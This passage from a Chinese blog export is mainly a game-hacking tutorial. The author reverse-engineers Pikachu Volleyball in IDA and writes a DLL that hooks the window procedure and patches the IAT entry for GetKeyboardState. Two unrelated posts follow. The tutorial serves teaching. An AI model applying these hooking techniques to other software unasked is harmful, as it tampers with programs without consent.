即可以回到外層，如果內容沒有更新只要按一下 f5 就可以。這裡發現 controls 被放到了第二個參數，而第一個參數 this-dword28 我們此時還不確定是什麼，但因為接下來的程式沒有使用到 controls，所以我們這裡可以大膽假設 this-dword28 應該存有皮卡丘的遊戲數據。 重新回到 sub_404E30 中，此時我們可以先修好 function 的定義，因為跟據傳進來的參數我們知道第二個參數的型別應該是 nini_controls* 才對，你可以選擇對 function 名稱按 Y 或是單純對 a2 按 Y，總之改好他。 用處有兩個： 我們可以繼續往下修正其他 function 的參數型別 假設有其他 function 也有呼叫這個 function，我們就可以反推第二個傳進來的變數應該是什麼型別（例如 sub_404e30(v1, v2)，假設 v2 本來被誤認成 int，我們就可以按 Y 去把它修正成 nini_control*） 接下來就照心情隨便逛逛，看看哪裡有拿我們的 nini_control 做運算，先看 sub_404F50 ，一樣先修好他的 type 只有 sub_403AC0 有用到，繼續跟進去，修正型別 這時候滑鼠點一下 a2 之後，整面的 a2 都會被 hightlight 起來（ghidra 也有一樣的功能，但要手動開啟），因為我們只在意 a2 到底被用去哪了，所以可以看一下 highlight 的地方找一下線索，譬如說我們發現 a2 被傳進 sub_403D70 做使用，我們一樣就跟進去 點進 sub_403D70 後，sub_403D70 從一個參數變成了兩個參數，Esc 回頭檢查一下 修正型別 往下滑就會發現好像中獎了，因為 a2 賦值給 v20 後， v20 被拿來跟兩個東西做運算，很有可能是皮卡丘 更下面一點也有拿 speedY 的操作來做運算，（在皮卡丘打排球裡按下再殺球會是一個急墜殺球） 這裡先看一下 v20 具體是怎麼用的 一樣跟進 sub_401FE0 並且修復型別。注意，這裡進去 sub_401FE0 後三個參數變成了四個，所以記得退回上一步檢查，重新 f5 應該會變成這樣 修復型別 從這裡開始，會發現 function 內容已經在根據 a2 的 speedx 跟 speedy 是 -1, 0 還是 1 來做出相對應的運算，而運算都針對在 this 這個指標上面，例如 所以很明顯的，this 就是皮卡丘物件了，透過一樣的手法，「reset pointer type」-&gt;「create new structure」，我們就叫他 nini_pikachu 一樣透過 a2 來分析，可以還原出一些皮卡丘這個物件的重要 member，例如下面 48 行附近的程式碼，我們可以猜到 dwordA8 應該就是皮卡丘的 X 座標 用前面教的方法，一樣對 dwordA8 重新命名，弄成好看的樣子 接著分析看看 dwordAC，從 struct 來看在 posX 的後面（posX 是 0xA8，int 佔 4 byte，所以 0xAC 就是下一個），然後跟 speedy 有關係，244 看起來就是 Y 軸邊界檢查，dwordB0 看起來就是重力，所以 dwordAC 應該就是 posY 了，直接猜。（視窗的左上角是 x,y &#x3D; 0,0，往右邊 x 增加，往下面 y 增加） 改名 此時稍微回到 function 一開始的地方，這裡有個呼叫，跟進去 sub_402380 看一下 修復型別（注意最後有個 nini_control 被傳進來，可以自行確認） 會發現，control 被清空了，然後透過一連串的運算重新決定 control 是什麼，所以我們可以確定，這個 function 就是電腦操作皮卡丘的邏輯 那我們可以把它重新命名 回到上一步呼叫他的地方 從這裡可以推理出來 dwordA4 就是決定一個皮卡丘角色是不是由電腦來操作的 bool，我們也重新命名他 好讓我們先把剛剛這個 function 也命名好，我們改成一個簡單易懂的名字 然後回到使用他的地方，可以用 Esc 或是用快捷鍵 X 的方式找到。看一下會發現我們的皮卡丘物件是從這個 function 的 this 裡被拿出來的 所以我們一樣幫 this 做一個 structure，因為它存了兩個玩家，所以姑且叫他 nini_entities 然後一樣我們要來修正 member 的類別，intC 很明顯就是要改成 nini_pikachu 而且因為下面有個 do 迴圈，所以我們把它修正成 nini_pikachu *intC[2]，而 v5 應該是 nini_pikachu**，同時我們把 intC 重新命名成 players 很棒，那我們這裡可以回頭分析一下排球在哪裡，當然這一步，或是皮卡丘物件都可以透過動態分析定位到，但本次練習的目的是讓大家熟悉逆向工具的操作，還有分析時的思考方式，所以覺得好玩的話也可以自己動手用 Cheat Engine 動態分析來加速我們這整個定位到物件的流程。 接下來在同個 function 中稍微看一下會發現，在這個 funciton 中，只要運算皮卡丘的地方（do while 迴圈），dword14 就會莫名其妙的跟兩隻皮卡丘一起做運算，感覺有極高機率是在運算碰撞事件（皮卡丘撞到它），有可能是障礙物或是邊線，也有可能就是我們在找的球，所以可以試著分析看看。 那我們跟進第 31 行的 sub_402DA0 中，稍微看一下會發現，中間一段程式碼看起來像在處理球碰撞到視窗邊界，例如 38 行，看起來像是檢查 位置+速度-球的圖片素材寬度/2 &gt;= 螢幕寬度 (寫遊戲常見的運算，因為圖片的座標是由圖片矩形的左上角來定位，所以算碰撞的時候會把這個點加上素材寬度的一半，才會真的用圖片的正中心做運算)，如果是 true 的話就把 this[14] 變成 -this[14](因為 v2 也是從 this[14] 拿出來的)，看起來 this[14] 就是球運動的速度。 一樣，幫 this 製作結構，這裡我們叫他 nini_ball，根據我們剛剛精彩的推論來重新命名結構 好，這裡的任務算是完成了，回到上一層呼叫這個 function 的地方 現在我們知道這個 member 跟 function 在做什麼了，嘗試命名跟修復型別(nini_ball*) 現在我們已經姑且復原了皮卡丘跟球的 struct （因為我們只是要控制球的位置還有打開皮卡丘的電腦模式，已經算是足夠）。但有個問題就是這些物件存在在指標中，而每次重新開始遊戲時，指標所分配到的位置都不一樣。然而在程式設計時，應該會有一個最上層的物件，是存在在 global 的地方來方便工程師使用物件，而 global 的位置就是我們可以定位到的，他不會隨著程式重新開啟而變動（因為這個遊戲的 code 沒有做位址空間組態隨機載入，ASLR），因此接下來我們要找這個最上層物件，我們的作弊程式就可以先定位到這個最上層物件，然後再一層一層定位到皮卡丘跟排球這三個指標這次執行的記憶體位置。 所以我們就從 403d70 這個 function 開始，一層一層按快捷鍵 X 往上看物件是怎麼被傳遞下來的 好，先往上一層，這裡的 this 型別需要被我們修復成 nini_entities* （根據 sub_403D70 的參數型別） 往上滑到這個 function 的開頭 再往上一層，這裡的 this+16 是 nini_entities*，表示 this 又是另外一個物件，一樣，我們「create structure type」，並且修復類別與名稱 大概就長這樣，因為還不知道這個結構叫什麼好，姑且叫他 nini_this_404F50 再往上一層 一樣，根據 sub_404F50 的第一個參數的型別，我們修復一下參數 然後再往上一層，會發現 nini_this_404F50 其實是 nini_this_401460 中的一個 member 這裡一樣修復他的型別 一樣滑到 function 的最上面 然後往上一層，會發現我們跑到了奇怪的地方！ 這裡其實就是 vtable，也就是一個用來記錄物件的 member function 的 array。那這個「某個物件」是什麼呢？在寫 C++ 的類別時，在該類別的 member function 中我們通常都可以使用 this 來找到自己，這個 this 實際上的實作方式就是把自己當作第一個參數傳進去所有 member function 裏面！所以表示什麼？表示 sub_401460 是 nini_this_401460 的 member function，而我們現在看到的正是 nini_this_401460 的 vtable。那接下來要怎麼辦？稍微往上滑，不要太大力，會發現前面有個地方有標籤 off_40F000，這表示 IDA 有發現這個位置有被別人使用，所以我們可以知道，這個位置很大機率就是 vtable 的起頭（因為要把 vtable 賦予給所有新創造的 nini_this_401460 物件） 接下來一樣，在 off_40F000 上按快捷鍵 X，會發現有兩個引用，而通常 vtable 會在物件的建構子跟解構子中被使用，我們隨便看一下第一個引用 這裡有一堆 new，基本上可以確定這是建構子 順手修復一下型別 然後一樣按 X 找到他的上一層，就回到了視窗的 main，而透過參數知道 v5 應該是一個 nini_this_401460 的 structure，讓我們跟著 v5 往下跟進 sub_401240 看看 修復型別 往下看到第 28 行， 進去 sub_404BE0 會看到第二個參數因為有被拿去做一些 GetDC 等等的操作， IDA 有認出來他的型別是 HWND，意思是 handle of Window，也就是用來操作跟視窗相關的一個 handle（類似號碼牌的概念，拿著號碼牌就可以存取對應的視窗），這個 handle 對我們來說非常實用，因為我們要控制視窗的滑鼠點擊事件需要他。 所以我們可以回上一層修復 gap4 的名稱跟型別，同時往下看到第 30 行，呼叫 sub_4062B0 的這個 function 隨便點進去看看會發現，他把 this 設定到 global 變數上了！ 所以我們的作弊程式只需要把 0x4110D8 當做一個 nini_this_401460 * 來解析的話就可以找到皮卡丘物件跟球物件了！接下來我們要匯出 struct，按下快捷鍵 shift + f1，或是如下圖所示從工具列打開 subview 中的 local types 在搜尋列上打我們先前常用的前綴就可以找出所有我們定義的 structure 這裡可以做一些簡單的修正，例如 nini_this_401460，他是最上層結構，我想把他重新命名成 nini_program，這裡就點選他 可以按 ctrl+E 或是右鍵 edit 來編輯 nini_this_404F50 也一樣，我想把它改成 nini_game 突然想到，回頭重新命名一下 nini_program，把 nini_game* 的這個 member 重新命名成 game 這個好懂一點的名字 框選全部想匯出的 struct，右鍵 export to header file，我們就可以快速把他們匯出成 C&#x2F;C++ 方便使用的形式了。 注入王之力！注入我們的程式碼到遊戲中有很多方法，但因為皮卡丘打排球基本上沒有保護，所以我們也不用想太多花招。像我這種有禮貌的紳士就是請皮卡丘打排球的程式直接讀我們的 dll 進去讓我們作弊，拜託幾個勒。 在拜託之前，我們先來寫 dll，我們在 visual studio 中建立一個 dll 範本 因為 IDA 使用的型別名稱中多了個底線 _DWORD _BYTE所以使用前記得補上 typedef DWORD _DWORD;typedef BYTE _BYTE; 複製貼上匯出的 structure 或是 include 都行，但下面這兩個沒用到可以刪了 我們講解一下 code 的部分，DllMain 就是 dll 被載入時首先執行的地方，這裡我們開一個 thread 執行 function hakcingStart，這樣才不會把遊戲程式卡死， //https://learn.microsoft.com/en-us/windows/win32/dlls/dllmainBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hackingStart, NULL, NULL, NULL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125; 接下來我們要做的事情有兩個： 劫持遊戲用來處理視窗消息的 function，這樣我們才能處理滑鼠事件 找個地方修改記憶體讓我們可以定住球或是把皮卡丘改成電腦模式。 第 1. 步很直覺可以完成，首先我們先解析 0x4110D8 這個 global variable（我們前面逆向過了，用來存 program 的地方），因為不知道什麼時候他會初始化完成，所以寫個迴圈來等他完成我們再做後面的事情，完成後我們來看看 hookWndProc 做了什麼。 nini_program* pProgram;BOOL(__stdcall* pfnGetKeyboardState)(PBYTE lpKeyState);void hackingStart() &#123; do &#123; pProgram = *(nini_program**)0x4110D8; Sleep(200); //#include &lt;time.h&gt; &#125; while (!pProgram); hookWndProc(pProgram); //overwrite the address of GetKeyboardState in IAT //save the real address of GetKeyboardState pfnGetKeyboardState = GetKeyboardState; hookIAT();&#125; 這裡用了 SetWindowLongPtr 這個 function 把處理消息的函式改成我們寫的 WndProc ，而舊的消息處理會被回傳，所以我們用 oldWndProc 把他接起來。WndProc 裡面做的事情是去檢查滑鼠事件，然後用 CallWindowProc 去呼叫本來處理消息的函式，這樣其他事件才會正常被處理，到這裡我們已經處理完滑鼠的訊號了！ WNDPROC oldWndProc = NULL;bool bBallFreeze = FALSE;LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) &#123; switch (message) &#123; case WM_RBUTTONDOWN: bBallFreeze = TRUE; break; case WM_RBUTTONUP: bBallFreeze = FALSE; break; &#125; return CallWindowProc(oldWndProc, hWnd, message, wParam, lParam);&#125;void hookWndProc(nini_program* pProgram) &#123; //https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowlongptra oldWndProc = (WNDPROC)SetWindowLongPtr(pProgram-&gt;hwnd, GWLP_WNDPROC, (LONG_PTR)WndProc);&#125; 接下來要說第二件事情，找個地方修改記憶體讓我們可以定住球或是把皮卡丘改成電腦模式。我們可以有很多花招，但最快速簡單的方法是 IAT hijack。效果是當皮卡丘打排球程式去呼叫外部 function 的時候，會先執行我們的程式碼，才去做真正本來他想呼叫的外部 function，而且這個劫持的點應該要在皮卡丘真的移動之前（不然就會等到下一個 game tick 才作動，而且不確定會不會被覆寫）。 這裡最理想的就是每輪都會執行，而且只被一個地方使用的 GetKeyboardState，所以回到我們的 hackingStart，因為等等我們會把 GetKeyboardState 在 IAT 上紀錄的位置劫持走，所以我們要先把它保存起來，不然後面我們就真的拿不到鍵盤輸入，之後才是使用 hookIAT 來進行劫持 nini_program* pProgram;BOOL(__stdcall* pfnGetKeyboardState)(PBYTE lpKeyState);void hackingStart() &#123; do &#123; pProgram = *(nini_program**)0x4110D8; Sleep(200); //#include &lt;time.h&gt; &#125; while (!pProgram); hookWndProc(pProgram); //overwrite the address of GetKeyboardState in IAT //save the real address of GetKeyboardState pfnGetKeyboardState = GetKeyboardState; hookIAT();&#125; 那我們來看看 hookIAT 做了啥，這裡透過 GetModuleHandleA(NULL) 得到整個皮卡丘打排球的程式在記憶體中的位置之後，我們就等於定位到了一個存在在 memory 上的 PE file，運用我們對 PE 程式的初淺理解（這裡有興趣的學員可以自行 google，我沒有時間了ＱＱ），找到 IAT 中用來紀錄外部 function GetKeyboardState 在哪裡的欄位，把他改寫成我們的壞壞函式 hookedGetKeyboardState。注意這裡用 VirtualProtect 把該記憶體位置的寫權限打開，因為那裡本來不能寫。 #include &lt;Windows.h&gt;#include &lt;winternl.h&gt;void hookIAT() &#123; UINT_PTR uiPikaballBase = (UINT_PTR)GetModuleHandleA(NULL); PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiPikaballBase; PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(uiPikaballBase + pDosHeader-&gt;e_lfanew); PIMAGE_DATA_DIRECTORY pImportsDirectory = (PIMAGE_DATA_DIRECTORY)&amp;pNtHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]; PIMAGE_IMPORT_DESCRIPTOR pImportDesccriptor = (PIMAGE_IMPORT_DESCRIPTOR)(uiPikaballBase + pImportsDirectory-&gt;VirtualAddress); while (pImportDesccriptor-&gt;Name) &#123; LPCSTR libraryName = (LPCSTR)(uiPikaballBase + pImportDesccriptor-&gt;Name); if (!_stricmp(libraryName, &quot;user32.dll&quot;)) &#123; LoadLibraryA(libraryName); PIMAGE_THUNK_DATA pOriginalFirstThunk = (PIMAGE_THUNK_DATA)(uiPikaballBase + pImportDesccriptor-&gt;OriginalFirstThunk); PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)(uiPikaballBase + pImportDesccriptor-&gt;FirstThunk); while (pOriginalFirstThunk-&gt;u1.AddressOfData) &#123; PIMAGE_IMPORT_BY_NAME pFunctionName = (PIMAGE_IMPORT_BY_NAME)(uiPikaballBase + pOriginalFirstThunk-&gt;u1.AddressOfData); if (!_stricmp(pFunctionName-&gt;Name, &quot;GetKeyboardState&quot;)) &#123; DWORD oldProtect = 0; VirtualProtect((LPVOID)(&amp;pFirstThunk-&gt;u1.Function), 4, PAGE_READWRITE, &amp;oldProtect); pFirstThunk-&gt;u1.Function = (DWORD)hookedGetKeyboardState; VirtualProtect((LPVOID)(&amp;pFirstThunk-&gt;u1.Function), 4, oldProtect, &amp;oldProtect); return; &#125; else &#123; ++pOriginalFirstThunk; ++pFirstThunk; &#125; &#125; &#125; pImportDesccriptor++; &#125;&#125; 那 hookedGetKeyboardState 做的事情就是我們真正作弊的邏輯了，把第二個玩家設定成電腦（這裡你可以把第一個玩家是電腦的設定關掉，你就可以玩左邊角色了，電腦玩家的演算法在左邊比較強）。 然後在bBallFreeze 是 true 的情況下，我們先 GetCursorPos 來獲得滑鼠的 x,y 座標，然後用 ScreenToClient 把滑鼠座標換算成在視窗內的滑鼠座標，接下來就是一頓操作讓球的座標跟滑鼠一樣然後速度歸零，最後的最後，去呼叫本來用來獲取鍵盤輸入的 function 確保程式不會出錯！ BOOL WINAPI hookedGetKeyboardState(PBYTE lpKeyState) &#123; pProgram-&gt;game-&gt;entities-&gt;players[1]-&gt;isComputer = TRUE; //pProgram-&gt;game-&gt;entities-&gt;player[0]-&gt;isComputer = FALSE; if (bBallFreeze) &#123; POINT cursorPos; GetCursorPos(&amp;cursorPos); ScreenToClient(pProgram-&gt;hwnd, &amp;cursorPos); pProgram-&gt;game-&gt;entities-&gt;ball-&gt;posX = cursorPos.x; pProgram-&gt;game-&gt;entities-&gt;ball-&gt;posY = cursorPos.y; pProgram-&gt;game-&gt;entities-&gt;ball-&gt;speedX = pProgram-&gt;game-&gt;entities-&gt;ball-&gt;speedY = 0; &#125; return pfnGetKeyboardState(lpKeyState);&#125; 最後 export 一個其實沒東西的 function，方便我們等等去修改皮卡丘打排球的 IAT，讓他以為他需要使用我們 dll 中的 Dummy function。 __declspec(dllexport) void Dummy() &#123;&#125; 接下來編譯成 dll 就可以了！記得選擇成 x86 才編譯，因為我們的遊戲也是 x86 看 compile 的資訊及可以找到 visual studio 把我們的 dll 放在哪 接下來，把 dll 複製到遊戲資料夾裡面。 接下來是最後一步了，我們要禮貌地請 PikaBall.exe 載入我們的作弊 dll，拜託幾個勒。請打開課程附件中的 CFF Explorer.exe（在 CFF_Explorer.zip 裏面） 載入 選擇 Import Adder Add 選我們剛剛 compile 出來的 dll 選我們的 Dummy function 後使用 Import By Name 確認右手邊成功後，點選 Rebuild Import Table 成功 按存檔 要不要覆蓋都行，我建議不要 存成 PikaBall_hack.exe 放置型皮卡丘打排球選擇單人遊戲時，不是由玩家挑戰電腦，而是電腦的左右互搏，把皮卡丘打排球玩成放置型遊戲！除此之外還可以透過右鍵控制排球，一圓跟皮卡丘玩傳接球的夢想。 The `` tag is not supported by your browser.","categories":[{"name":"WriteUp","slug":"WriteUp","permalink":"http://blog.terrynini.tw/categories/WriteUp/"}],"tags":[{"name":"Reversing","slug":"Reversing","permalink":"http://blog.terrynini.tw/tags/Reversing/"},{"name":"GameHacking","slug":"GameHacking","permalink":"http://blog.terrynini.tw/tags/GameHacking/"}]},{"title":"2024::幫部落格增加註釋的功能！","slug":"2024-幫部落格增加註釋的功能！","date":"2024-06-22T17:00:23.000Z","updated":"2024-06-22T18:01:07.974Z","comments":true,"path":"tw/2024-幫部落格增加註釋的功能！/","permalink":"http://blog.terrynini.tw/tw/2024-%E5%B9%AB%E9%83%A8%E8%90%BD%E6%A0%BC%E5%A2%9E%E5%8A%A0%E8%A8%BB%E9%87%8B%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%81/","excerpt":"忙了一段時間都沒有好好維護部落格，除了資料有點舊之外，換了電腦才發現 Hexo 版本超級舊跑什麼東西都會踩到一堆 Bug。而且正好一直有一個很想做的功能：在文章旁邊顯示註解！正好有點時間，就順便做完了，大概紀錄一下這個功能是怎麼實作的之外，確實也需要一篇文章來測試一下這個功能XD。 自己感覺這篇文章用電腦板來看，效果應該是最好的。","text":"忙了一段時間都沒有好好維護部落格，除了資料有點舊之外，換了電腦才發現 Hexo 版本超級舊跑什麼東西都會踩到一堆 Bug。而且正好一直有一個很想做的功能：在文章旁邊顯示註解！正好有點時間，就順便做完了，大概紀錄一下這個功能是怎麼實作的之外，確實也需要一篇文章來測試一下這個功能XD。 自己感覺這篇文章用電腦板來看，效果應該是最好的。 網路巡邏之前在看別人的部落格的時候就有注意到有些文章會有 sidenote 的效果，譬如 Secret Club 就有非常簡單的 sidenote 格式，讀起來很舒服，有時候也會有 code 形式的內容包在裡面 基本上都在英文網站看到，中文世界不流行？ 也有比較酷炫的版本，像是 DOWN TO THE WIRE 這篇關於 DEFCON 的文章，有趣的地方是它的 sidenote 內文有更多的 HTML tag 可以使用。 應該是 CTF 戰隊 PPP 相關的人寫的部落格 實作時間簡單的 google 一下可以看到很多關於 HTML5 引入的 &lt;aside&gt; 的資訊，但實際上卻很少範例是直接使用這個 tag 來製作 sidenote。盤點一下實作時遇到的一些問題（使用 Hexo）： 直接使用 &lt;aside&gt; 的限制首先要知道，&lt;p&gt; 內不能有區塊級的元素，不然段落會被自動關閉，所以用 Hexo 撰寫文章時，如果直接在的 markdown 中這樣寫的話： 我破防了禁止禁止啊啊啊huhhuhhuh漬鯊&lt;aside&gt;但我怕痛&lt;/aside&gt;我就這樣了嗚哇哇哇哇哇 實際上會被 render 成下面這樣： 注意到內文中的 我就這樣了嗚哇哇哇哇哇，因為 &lt;p&gt; 被關閉導致強置換行之外，aside 之後的內文也沒有被 &lt;p&gt; 包起來，解法也很簡單就是 aside 都乖乖放在正好換行的地方就好了。但很多人因此改用一些非區塊級的元素來實作 sidenote 功能，好處是在寫 plugin 的時候可以用一個語法完成，不用放太多注意力在文章本身以外的事情。 譬如說，「看看旁邊的 sidenote 寫了什麼」這段文字在編輯時，寫起來可能就會是這樣： haha this is sidenote 看看旁邊的 &#123;% mark &quot;haha this is sidenote&quot; %&#125; sidenote 寫了什麼 &#123;% endmark %&#125; 另外一個好處就是，可以純用 CSS 做出尋找對應片段的效果，直接看看這個部落格。這是他 sidenote 的主要語法（這是 Hugo 的外掛） &lt;span class=&quot;sidenote&quot;&gt;&lt;label class=&quot;sidenote-label&quot; for=&quot;&#123;&#123; .Get 1 &#125;&#125;&quot;&gt;&#123;&#123; .Get 2 &#125;&#125;&lt;/label&gt;&lt;input class=&quot;sidenote-checkbox&quot; type=&quot;checkbox&quot; id=&quot;&#123;&#123; .Get 1 &#125;&#125;&quot;&gt;&lt;/input&gt;&lt;span class=&quot;sidenote-content sidenote-&#123;&#123; .Get 0 &#125;&#125;&quot;&gt;&#123;&#123; .Inner &#125;&#125;&lt;/span&gt;&lt;/span&gt; 注意 sidenote-label 與 sidenote-content 就好，因為他們都被置於 sidenote 之中，所以特效寫起來就會很簡單，只需要 CSS 就能搞定。 如果我要分開寫，最後還需要塞一些 js 讓重點句子與 sidenote 可以找到彼此，在知道對方被 hover 時做出一些特效。前面提到的 DOWN TO THE WIRE，雖然從圖片上看起來他的重點句子跟 sidenote 之間好像也有做對應，不過實際上他是不能互動的，只是一直 highlight 在那裡（我也不是很確定為什麼我要讓它動起來就是了，可能比較酷？大概）。 如果重點句子與 sidenote 不包在一起，還是有辦法可以用純 CSS 做出尋找對應片段的效果，但只能是單向的。例如，使用下面的 selector ，當重點句子被 hover 時，下一個找到的 sidenote 就會被套用 border-bottom 的效果： p:has(.sidenote-mark:hover) ~ aside &#123; border-bottom: 2px solid #f75357;&#125; 但 CSS 沒有 selector 可以尋找上個元素，所以無法反過來讓 .sidenote-mark 做出改變。 寫個 Plugin因為我真的很想在 sidenote 裡面塞一堆鬼東西，就像上面那個塞了 code snippet 的一樣，所以我寫了個 hexo 的 plugin：hexo-sidenote（但只有我知道怎麼用，因為實在寫的太陽春），我現在可以用下面語法來寫 sidenote： &#123;% mark 5 %&#125;這是 id 為 5 的重點，它會被對應到&#123;% endmark %&#125;」……？&#123;% sideNote 5 %&#125; id 為 5 的 note，沒錯&#123;% endsideNote %&#125; 效果就是，這是 id 為 5 的重點，它會被對應到……？ id 為 5 的 note，沒錯 Future Work雖然一直用 sidenote 感覺對寫作來講就很不健康，如果有心應該總是有辦法可以把那些塞進 sidenote 裡的那駝鬼東西好好的寫進內文，但，就爽嘛。但現在這個外掛，它有個大病，就是靠太近的 sidenote 會把彼此覆蓋在一起，不知道有沒有什麼輕鬆的解法可以讓他們不要 overlap，但我想就……就……改天吧……","categories":[{"name":"Record","slug":"Record","permalink":"http://blog.terrynini.tw/categories/Record/"}],"tags":[{"name":"CSS","slug":"CSS","permalink":"http://blog.terrynini.tw/tags/CSS/"},{"name":"Dev","slug":"Dev","permalink":"http://blog.terrynini.tw/tags/Dev/"}]},{"title":"2023::自由美利堅::上羚羊峽谷之旅","slug":"2023-自由美利堅-上羚羊峽谷之旅","date":"2023-08-22T14:14:06.000Z","updated":"2024-06-22T14:05:55.550Z","comments":true,"path":"tw/2023-自由美利堅-上羚羊峽谷之旅/","permalink":"http://blog.terrynini.tw/tw/2023-%E8%87%AA%E7%94%B1%E7%BE%8E%E5%88%A9%E5%A0%85-%E4%B8%8A%E7%BE%9A%E7%BE%8A%E5%B3%BD%E8%B0%B7%E4%B9%8B%E6%97%85/","excerpt":"好奇心旺盛的人類有太多的事情想做，與其被過於詳細的計畫所困擾，不如將自己投入於當下——想到什麼就做什麼。於是，我現在就要來寫篇文章。（圖片沒有死掉，只是因為我都沒有壓圖所以用手機看可能會跑到 timeout 要重新整理ＸＤＤ）","text":"好奇心旺盛的人類有太多的事情想做，與其被過於詳細的計畫所困擾，不如將自己投入於當下——想到什麼就做什麼。於是，我現在就要來寫篇文章。（圖片沒有死掉，只是因為我都沒有壓圖所以用手機看可能會跑到 timeout 要重新整理ＸＤＤ） 上羚羊峽谷從 2018 年開始，每年造訪拉斯維加斯這個不毛之地已經成了慣例。每次都會比規劃的時間更早一點出發到自由美利堅，作為調整時差的緩衝時間。但身為身強體壯、日夜顛倒的資工系學生，印象中我並沒有調整過時差。不是半夜四點起床吃麥當勞（自費），去靶場開開槍（自費），就是去大峽谷感受自身的渺小（自費）。 本次也毫不例外地開啟了支線任務（自費），此時我甚至不知道生命危險有多危險： 目的地羚羊峽谷，位於納瓦霍族人的保留地，距離我們現在的位置約 272英里，也就是 437.741568 公里，這大概是台北市到屏東縣的距離。 預計 09:00 出發，算上吃飯休息的時間，大概 5 小後 14:00 會到達。已經預先在線上買好了 15:30 的羚羊峽谷門票，$40&#x2F;人。看著非常完美的計劃，也似乎預示著不完美的時刻即將降臨。這趟旅途自開始的瞬間就觸發了許多事件。 首先我們的 Tesla Model 3 車主本來預計租一台 Tesla Model Y 來開開，但因為各種不可名狀的錯誤，最後導致在領車的時候獲得了一台本來就天天開的 Tesla Model 3（規格甚至比較差），而且因為領車的位置不太明確，導致一起去領車的幾個人在威尼斯人酒店打轉了一個多小時。同時其他人正在悠閒的逛著 711 還順便吃了個麥當勞。而命運的齒輪持續地轉動，目前大概多轉了 180 度。 在處理了各種問題後，我們終於開始了已經延後一個多小時的旅程。但，最重要的儀式感總是不能忘記，先學一下有錢的中年人，拍個方向盤。 重點是這台 MACAN 的車牌就是 MACAN，不知道車主花了多少精力弄來的。 相較之下幾天後我在 Uber 上叫的一台 Tesla 只能委曲求全。 在駛離市區前往一望無際的荒漠之前，我終於近距離目睹了 Sphere，這個大小想必連第四次忍界大戰中的尾獸玉也相形見絀。 駛進公路之後，不知是天氣太燥還是我們播放的饒舌歌曲太過激昂，Bookgin 體內的高雄人血液已然沸騰，在後座只能看到一輛又一輛的車輛向後方遠去。 連開著 911 的 Kaibro 都只能看著 Bookgin 的車尾燈苦笑著。此時大概是上午 11:43。 意外也或許沒這麼意外的是，這熱死人的公路上真的有非常符合刻板印象的騎士在行駛著。同時我也發現在車上拍照真的很吃角度，要不就拍到窗框，要不就拍到反射。 話雖如此，再強烈的反射似乎也掩蓋不了 Kaibro 心中的雀躍，看他笑得像個孩子似的。 過了一段充滿廢話與八卦的時間之後，到了我們預先設定好的第一個停靠點，這裡有加油站跟特斯拉超充站，為了避免在外面被曬成白痴，我們到附近的便利商店裡吹著冷氣，喝著只要 \\$1.29 的便宜美味垃圾飲料 AriZona green tea（以前只要 \\$0.99）。 在台灣打包行李時，因為沒有多的空瓶帶卸妝液，所以我帶了不防水的防曬，意外發現一個好處就是很好分享給大家，畢竟只要用水就洗得乾淨。在擦防曬的同時，我一直很懷疑這裡這麼熱為什麼加油站不會爆炸。但此時此刻，比起加油站爆炸，所有人早就發現一個更悲慘的現實——縱使是高雄人的車速，也無法讓我們在下午三點半之前到達佩吉市，這表示我們將錯過預定的入場時間。同時，Kaibro 還找不到 911 的鑰匙，一群人著急的在車子上摸來摸去，結果我一個箭步上前，往座位下面一摸就摸到了，真是幸運星。接下來所有人在便利商店裡上網查詢及打了幾個電話之後，我們確定今天及明天都沒有空位可以讓我們進去羚羊峽谷，頓時，幾個成年人在便利商店痛哭流涕、無能狂吼，於是大家決定抱著度假的心情到訂好的 Airbnb 睡一晚，順便看看附近有沒有什麼地方好玩，最少還有馬蹄灣可以去。 到了下個特斯拉充電點，此時大概下午 1:30，經過所有在場的頂大資工系與資管系的縝密計算，計算結果顯示路途上的超充站無法讓 Tesla Model 3 到達佩吉市。使用普通充電樁讓充電的時間變得非常的長，充飽電要八個小時，那得是隔天的事了，但如果不充飽貿然上路，在公路上沒電肯定是更悲劇。此時 Tesla 車主打算原地折返，要大家不要管他繼續前進，剎那之間，我腦海裡上百部動畫與電影的情節在此時此刻與現實重疊，Déjà vu。在眾人的堅持下，秉持著王道劇情中一個都不能少的設定，我們決定在下個普通充電站棄車逃逸放著讓特斯拉充電，回程再把它領回來，這樣我們只需要在最後的 70 miles 稍微擠一下，與失去旅伴相比似乎也不這麼難熬了。傷心過後的 Kaibro 還是不忘要拍一些照片放 Tinder。 接下來就是往地平線無止盡延伸的道路，任何曾經篤信地圓說的科學家行駛在這條路上都會變成地平說的擁護者。此時大概是下午 2:48。 經過了兩個小時的車程後，我們終於到了棄車點普通充電站，我們打算在這裡吃點東西稍作休息，本來想吃 PizzaHut，但經過後門的時候看到熟悉的配色彷彿喚起了大家被 217 支配的深遠記憶因為不能帶外食，放車上好像會壞掉，所以在附近找找看還有什麼能吃。此時大概是下午 3:30。 一回頭就發現招牌上那斗大又令人懷念的表意文字，搭配上道地亞洲人的字型美學，讓人好奇是什麼滋味可以在這人跡罕見的公路旁存活下來。 遺憾的是我們來晚了……來自東方的美味也無法在這片沙漠上常駐，只好回頭吃點洋人的玩意兒。只能說自由美利堅的垃圾食物真的特別好吃。 重新上路後，公路上的景色從沙漠漸漸變成莽原，出現了一些人類豢養的牲畜。 偶爾還會看到一些山（或是應該叫做大岩石），被標上神秘的英文。jwang 開始拍攝遠方每個帶有字母的大岩石，嘗試收齊整個字母表，直到今天他的挑戰都尚未結束。 下午 5:40，終於到了佩吉市外的鐵橋，下面是格蘭峽谷大壩，自私的人類阻斷了整個大陸的水源，如果沒有這個壩，或許此處就再也不會是沙漠。因為我不敢把手伸出去，所以我要偷 Kaibro 的照片： 下午 6:26，終於把行李放到 